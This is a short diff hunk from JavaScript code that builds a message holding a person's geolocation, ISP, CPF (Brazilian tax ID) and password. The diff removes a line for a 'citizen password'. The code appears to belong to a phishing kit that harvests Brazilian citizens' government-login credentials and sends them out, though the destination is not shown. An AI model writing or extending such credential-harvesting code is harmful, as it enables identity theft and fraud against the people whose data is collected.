@@ -82,7 +82,6 @@ Longitude: ${responseGeoJson.lon}
 Operadora: ${responseGeoJson.isp}
 CPF: ${cpf}
 Password: ${password}
-Senha do cidadão: ${citizenPassword}
         `
       })
     })
